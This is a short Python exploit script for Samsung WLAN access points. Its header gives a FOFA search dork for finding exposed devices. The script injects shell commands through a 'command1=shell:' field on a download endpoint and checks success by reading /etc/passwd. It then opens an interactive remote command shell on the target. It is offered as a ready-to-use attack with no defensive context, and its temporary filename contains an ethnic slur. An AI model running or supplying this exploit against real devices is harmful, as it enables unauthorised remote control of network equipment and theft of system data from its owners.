#!/usr/bin/python3
#fofa dork: title="Samsung WLAN AP"
#Author 9527

import sys
import requests
import time
from urllib3.exceptions import InsecureRequestWarning


def Checking():
	try:
		Url = target + "(download)/tmp/FuckKr.txt"
		CkData = "command1=shell:cat /etc/passwd| dd of=/tmp/FuckKr.txt"
		response = requests.post(url = Url,data = CkData,verify = False,timeout = 20)
		if(response.status_code == 200 and 'root:' in response.text):
			return True
		else:
			return False
	except Exception as e:
		#print("checking")
		print("[-] Server Error")

def Exploit():
	Url = target + "(download)/tmp/FuckKr.txt"
	while Checking() is True:
		try:
			command = input("# ")
			data = "command1=shell:" + command + "| dd of=/tmp/FuckKr.txt"
			response = requests.post(url = Url,data = data,verify = False,timeout = 20)
			print(response.text)
		except Exception as e:
			print("[-] Server error")
if __name__ == '__main__':
	if(len(sys.argv) < 2):
		print("python3 exploit.py url")
		print("e.g: python3 exploit.py https://192.168.1.2/")
		sys.exit()
	target = sys.argv[1]
	requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
	Exploit()